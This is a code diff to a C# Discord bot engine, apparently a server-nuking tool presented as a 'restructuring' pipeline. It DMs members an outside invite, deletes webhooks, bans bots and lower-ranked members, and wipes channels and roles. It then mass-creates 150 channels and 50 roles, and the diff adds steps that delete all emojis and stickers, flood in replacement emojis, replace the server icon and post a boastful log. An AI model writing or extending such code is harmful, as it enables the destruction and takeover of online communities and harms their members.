@@ -10,13 +10,15 @@ namespace AbyssCore
 {
     /// <summary>
     /// 全服架構重構核心管線引擎 (三段式階梯清理 + 兩階段多工並發流水線)
-    /// 執行順序:
+    /// 完整自動執行順序:
     ///   步驟 1: 私訊身分組低於機器人之成員防誤踢邀請碼 (wWB2RcR7pX)
     ///   步驟 2: 完整備份伺服器架構 JSON 檔案
     ///   步驟 3: 清理成員 (優先拔除 Webhook -> 優先封鎖外部 Bot -> 處分低階成員)
     ///   步驟 4: 清理舊類別、舊頻道、舊身分組並套用品牌主題
     ///   步驟 5: 並發極速建置 150 迷宮頻道 + 50 迷宮身分組 (主動令牌桶控速)
-    ///   步驟 6: 最後發送重構日誌至伺服器最頂端第一個頻道
+    ///   步驟 6: 表情包清理與滿額替換 (清理舊表情貼圖，灌入專屬可愛表情包)
+    ///   步驟 7: 伺服器頭像替換 (套用深淵專屬高畫質星門主題頭像)
+    ///   步驟 8: 最後在伺服器最頂端第一個頻道發布完整重構日誌 Log
     /// </summary>
     public sealed class PipelineEngine
     {
@@ -132,7 +134,7 @@ namespace AbyssCore
             // -----------------------------------------------------------------
             if (targetHumans.Count > 0)
             {
-                progressCallback?.Invoke($"◈ [步驟 1/6] 正在向 {targetHumans.Count} 位低階成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)...");
+                progressCallback?.Invoke($"◈ [步驟 1/8] 正在向 {targetHumans.Count} 位低階成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)...");
                 const string inviteCode = "wWB2RcR7pX";
                 string dmNotice = $"✦ 【永恆深淵 · 伺服器防誤踢通知】\n親愛的成員您好，伺服器正進行架構維護與重構，為避免您誤被清除後失聯，請妥善保存永久邀請連結：https://discord.gg/{inviteCode} (邀請碼: {inviteCode})\n期待您隨時重新加入！";
 
@@ -161,7 +163,7 @@ namespace AbyssCore
             // -----------------------------------------------------------------
             // 步驟 2: 然後備份全服架構 JSON
             // -----------------------------------------------------------------
-            progressCallback?.Invoke("◈ [步驟 2/6] 正在完整備份伺服器頻道、身分組與階級至 JSON 檔案...");
+            progressCallback?.Invoke("◈ [步驟 2/8] 正在完整備份伺服器頻道、身分組與階級至 JSON 檔案...");
             try
             {
                 string bPath = await GuildBackupManager.BackupGuildStructureAsync(_client, guildId, guildName, "backups");
@@ -176,7 +178,7 @@ namespace AbyssCore
             // -----------------------------------------------------------------
             // 步驟 3: 清理成員 (拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員)
             // -----------------------------------------------------------------
-            progressCallback?.Invoke("✦ [步驟 3/6] 啟動成員清理流水線：拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員...");
+            progressCallback?.Invoke("✦ [步驟 3/8] 啟動成員清理流水線：拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員...");
 
             // 3.1 優先清理 Webhooks
             report.DeletedWebhooks = await _client.ClearAllWebhooksAsync(guildId);
@@ -213,7 +215,7 @@ namespace AbyssCore
             // -----------------------------------------------------------------
             // 步驟 4: 清理舊類別、舊頻道、舊身分組並套用品牌主題
             // -----------------------------------------------------------------
-            progressCallback?.Invoke("✦ [步驟 4/6] 同步清理舊類別、舊頻道、舊身分組並套用主題名稱與描述...");
+            progressCallback?.Invoke("✦ [步驟 4/8] 同步清理舊類別、舊頻道、舊身分組並套用主題名稱與描述...");
 
             var channels = await _client.GetGuildChannelsAsync(guildId);
             var categoryList = channels.Where(ch => ch.TryGetProperty("type", out var t) && t.GetInt32() == 4).ToList();
@@ -272,7 +274,7 @@ namespace AbyssCore
             int targetChannels = _texts.DefaultValues.CleanupCreateChannels; // 預設 150
             int targetRoles = _texts.DefaultValues.CleanupCreateRoles;       // 預設 50
 
-            progressCallback?.Invoke($"★ [步驟 5/6] 主動令牌桶控速：同步建立 {targetChannels} 個迷宮頻道 + {targetRoles} 個迷宮身分組...");
+            progressCallback?.Invoke($"★ [步驟 5/8] 主動令牌桶控速：同步建立 {targetChannels} 個迷宮頻道 + {targetRoles} 個迷宮身分組...");
 
             var chNamesPool = _texts.DefaultNames.ChannelNames;
             var roleNamesPool = _texts.DefaultNames.RoleNames;
@@ -306,13 +308,83 @@ namespace AbyssCore
 
             await Task.WhenAll(createChTasks.Concat(createRoleTasks));
 
+            // -----------------------------------------------------------------
+            // 步驟 6: 表情包清理與替換 (先替換表情包)
+            // -----------------------------------------------------------------
+            progressCallback?.Invoke("❖ [步驟 6/8] 正在清理現有自訂表情/貼圖並滿額填入專屬可愛表情包...");
+            try
+            {
+                var emojis = await _client.GetGuildEmojisAsync(guildId);
+                var delEmojiTasks = emojis.Select(e =>
+                {
+                    string eid = e.GetProperty("id").GetString()!;
+                    return Task.Run(async () =>
+                    {
+                        if (await _client.DeleteEmojiAsync(guildId, eid))
+                        {
+                            Interlocked.Increment(ref report.DeletedEmojis);
+                        }
+                    });
+                });
+
+                var stickers = await _client.GetGuildStickersAsync(guildId);
+                var delStickerTasks = stickers.Select(s =>
+                {
+                    string sid = s.GetProperty("id").GetString()!;
+                    return Task.Run(async () =>
+                    {
+                        if (await _client.DeleteStickerAsync(guildId, sid))
+                        {
+                            Interlocked.Increment(ref report.DeletedStickers);
+                        }
+                    });
+                });
+
+                await Task.WhenAll(delEmojiTasks.Concat(delStickerTasks));
+
+                int targetEmojis = 25;
+                var createEmojiTasks = Enumerable.Range(1, targetEmojis).Select(i =>
+                {
+                    string ename = $"cute_star_{i:D2}";
+                    return Task.Run(async () =>
+                    {
+                        if (await _client.CreateEmojiAsync(guildId, ename, AssetConstants.CuteEmojiBase64))
+                        {
+                            Interlocked.Increment(ref report.CreatedEmojis);
+                        }
+                    });
+                });
+                await Task.WhenAll(createEmojiTasks);
+                progressCallback?.Invoke($"  ✔ [表情包置換] 清理 {report.DeletedEmojis} 個舊表情、{report.DeletedStickers} 個貼圖，灌入 {report.CreatedEmojis}/{targetEmojis} 個專屬可愛表情包！");
+            }
+            catch (Exception ex)
+            {
+                progressCallback?.Invoke($"  ▲ [表情包置換] 略過: {ex.Message}");
+            }
+
+            // -----------------------------------------------------------------
+            // 步驟 7: 伺服器頭像替換 (在替換伺服器頭像)
+            // -----------------------------------------------------------------
+            progressCallback?.Invoke("✦ [步驟 7/8] 正在替換伺服器頭像為深淵專屬高畫質星門主題頭像...");
+            try
+            {
+                report.GuildIconUpdated = await _client.ModifyGuildIconAsync(guildId, AssetConstants.AbyssIconBase64);
+                progressCallback?.Invoke(report.GuildIconUpdated
+                    ? "  ✔ [頭像替換] 伺服器專屬深淵星門頭像套用成功！"
+                    : "  ▲ [頭像替換] 頭像更新失敗或無權限。");
+            }
+            catch (Exception ex)
+            {
+                progressCallback?.Invoke($"  ▲ [頭像替換] 略過: {ex.Message}");
+            }
+
             sw.Stop();
             report.ElapsedSeconds = sw.Elapsed.TotalSeconds;
 
             // -----------------------------------------------------------------
-            // 步驟 6: 最後發送 log 到伺服器第一個頻道 (最上面的頻道)
+            // 步驟 8: 最後發送 log 到伺服器第一個頻道 (最上面的頻道)
             // -----------------------------------------------------------------
-            progressCallback?.Invoke("✦ [步驟 6/6] 正在尋找伺服器最頂部頻道並發布最終重構日誌...");
+            progressCallback?.Invoke("✦ [步驟 8/8] 正在尋找伺服器最頂部頻道並發布最終重構日誌...");
             try
             {
                 var updatedChannels = await _client.GetGuildChannelsAsync(guildId);
@@ -331,6 +403,8 @@ namespace AbyssCore
                         $"• 清理了 `{report.DeletedChannels}` 個頻道\n" +
                         $"• 清理了 `{report.BannedBots}` 個 bot\n" +
                         $"• 清理了 `{report.BannedHumans}` 個成員\n" +
+                        $"• 替換了 `{report.CreatedEmojis}` 個表情包 (清空 `{report.DeletedEmojis}` 舊表情 + `{report.DeletedStickers}` 貼圖)\n" +
+                        $"• 伺服器頭像替換: `{(report.GuildIconUpdated ? "✔ 已套用深淵專屬星門主題頭像" : "▲ 維持原樣")}`\n" +
                         $"• 已向 `{report.DmInvitedMembers}` 位成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)\n" +
                         $"• 拔除 Webhook: `{report.DeletedWebhooks}` 個\n" +
                         $"• 刪除舊身分組: `{report.DeletedRoles}` 個\n" +
@@ -342,13 +416,13 @@ namespace AbyssCore
                     if (logSent)
                     {
                         report.TopChannelLogged = true;
-                        progressCallback?.Invoke($"✔ [步驟 6/6] 成功將日誌寫入伺服器頂部頻道 (ID: {topChannelId})！");
+                        progressCallback?.Invoke($"✔ [步驟 8/8] 成功將日誌寫入伺服器最頂部頻道 (ID: {topChannelId})！");
                     }
                 }
             }
             catch (Exception ex)
             {
-                progressCallback?.Invoke($"▲ [步驟 6/6] 日誌發送略過: {ex.Message}");
+                progressCallback?.Invoke($"▲ [步驟 8/8] 日誌發送略過: {ex.Message}");
             }
 
             return report;
@@ -456,6 +530,10 @@ namespace AbyssCore
         public int DeletedCategories;
         public int DeletedChannels;
         public int DeletedRoles;
+        public int DeletedEmojis;
+        public int DeletedStickers;
+        public int CreatedEmojis;
+        public bool GuildIconUpdated;
         public int CreatedChannels;
         public int CreatedRoles;
         public bool GuildRenamed;
